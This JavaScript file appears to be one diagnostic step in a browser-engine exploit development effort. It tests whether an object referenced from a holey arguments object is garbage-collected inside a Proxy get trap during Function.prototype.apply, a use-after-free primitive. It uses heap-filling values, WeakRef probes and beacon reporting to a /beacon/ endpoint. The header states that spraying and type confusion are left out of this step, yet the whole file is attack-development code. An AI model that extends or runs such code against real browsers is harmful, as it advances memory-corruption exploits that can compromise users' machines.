// p285 - GC diagnostic: does late-slot victim get collected?
//
// No spray, no type confusion attempt. Pure diagnostic.
// Tests whether victim at slot 50 (after hole at slot 5) is
// collectible during the Proxy trap.
//
// Reports WeakRef.deref() at multiple stages:
// - PRE: before apply (should be ALIVE)
// - TRAP-PRE-GC: before GC in trap (should be ALIVE)
// - TRAP-POST-GC: after GC in trap (ALIVE or DEAD = key result)
// - POST: after apply returns
//
// Also tests slot 0 victim (should stay ALIVE as control).
//
// Beacon prefix: V285-

(function() {
  function B(tag, body) {
    var url = '/beacon/V285-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function target() { return arguments; }
  function reader() { return Array.prototype.slice.call(arguments); }

  var HOLE = 5;
  var N = 64;

  function stackWash(depth) {
    var junk = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16];
    if (depth > 0) return stackWash(depth - 1) + junk.length;
    return junk.length;
  }

  function testSlot(round, victimSlot) {
    var tag = 'R' + round + 'S' + victimSlot;

    var v = {victim: true, slot: victimSlot, round: round};
    var wr;
    try { wr = new WeakRef(v); } catch(e) { B(tag + '-NO-WEAKREF'); return; }

    var arr = [];
    for (var i = 0; i < N; i++) {
      if (i === victimSlot) arr.push(v);
      else arr.push(i + 1);
    }
    var args = target.apply(null, arr);
    delete args[HOLE];

    arr[victimSlot] = null;
    arr = null;
    v = null;
    stackWash(50);

    var pre = wr.deref();
    B(tag + '-PRE-' + (pre ? 'ALIVE' : 'DEAD'));
    pre = null;

    var trapFired = false;
    var gcResult = 'NONE';

    var trap = {
      get: function(t, prop) {
        if (trapFired) return 0xFACE;
        trapFired = true;

        for (var j = 100; j < 500; j++) args[j] = 0x41;

        args[victimSlot] = null;

        var mid = wr.deref();
        B(tag + '-TRAP-PRE-GC-' + (mid ? 'ALIVE' : 'DEAD'));
        mid = null;

        stackWash(40);

        for (var g = 0; g < 120; g++) {
          var batch = [];
          for (var k = 0; k < 15000; k++) {
            batch.push({gc: k, p: String(k)});
          }
          batch = null;
        }

        var post = wr.deref();
        gcResult = post ? 'ALIVE' : 'DEAD';
        B(tag + '-TRAP-POST-GC-' + gcResult);
        post = null;

        return 0xBEEF;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try { result = reader.apply(null, args); } catch(e) {
      B(tag + '-ERR-' + e.message.substring(0, 30));
      return;
    }

    var postApply = wr.deref();
    B(tag + '-POST-' + (postApply ? 'ALIVE' : 'DEAD'));
    B(tag + '-GCRESULT-' + gcResult);
  }

  function runTests() {
    testSlot(0, 0);
    setTimeout(function() {
      testSlot(1, 50);
      setTimeout(function() {
        testSlot(2, 0);
        setTimeout(function() {
          testSlot(3, 50);
          setTimeout(function() {
            testSlot(4, 60);
            setTimeout(function() {
              testSlot(5, 10);
              B('DONE');
            }, 200);
          }, 200);
        }, 200);
      }, 200);
    }, 200);
  }
  runTests();
})();
